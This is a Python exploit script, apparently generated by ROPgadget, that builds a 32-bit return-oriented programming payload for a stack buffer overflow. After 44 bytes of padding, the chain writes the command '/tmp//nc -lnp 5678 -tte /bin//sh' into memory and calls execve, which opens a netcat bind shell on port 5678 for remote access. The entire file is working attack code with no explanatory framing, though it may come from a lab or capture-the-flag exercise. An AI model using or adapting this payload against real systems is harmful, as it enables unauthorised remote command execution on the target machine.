#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack
import sys

# Padding goes here
p = b'A'*44

# Store /tmp//nc in .data (terminated by null) (filename)
p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'/tmp'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'//nc'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

# Store args in .data
p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da06c) # @ .data + 12
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'-lnp'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da070) # @ .data + 16
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da074) # @ .data + 20
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'5678'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da078) # @ .data + 24
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da07c) # @ .data + 28
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'-tte'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da080) # @ .data + 32
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da084) # @ .data + 36
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da088) # @ .data + 40
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da08c) # @ .data + 44
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

# Store pointers to filename, args (terminated by null) (argv)
p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da090) # @ .data + 48
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += pack('<I', 0x080da060) # @ .data (filename)
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da094) # @ .data + 52
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += pack('<I', 0x080da06c) # @ .data + 12 (-lnp)
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da098) # @ .data + 56
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += pack('<I', 0x080da074) # @ .data + 20 (5678)
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da09c) # @ .data + 60
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += pack('<I', 0x080da07c) # @ .data + 28 (-tte)
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da0a0) # @ .data + 64
p += pack('<I', 0x080a8cb6) # pop eax ; ret
p += pack('<I', 0x080da084) # @ .data + 36 (/bin//sh)
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da0a4) # @ .data + 68
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret

# Put filename in ebx
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data

# Put argv in ecx
p += pack('<I', 0x0806e162) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da090) # @ .data + 48
p += pack('<I', 0x080da060) # padding without overwrite ebx

# Put envp (null) in edx
p += pack('<I', 0x0806e13b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8

# Put execve syscall number in eax
p += pack('<I', 0x08056190) # xor eax, eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret
p += pack('<I', 0x0807ba0a) # inc eax ; ret

# Syscall
p += pack('<I', 0x080495f3) # int 0x80

sys.stdout.buffer.write(p)
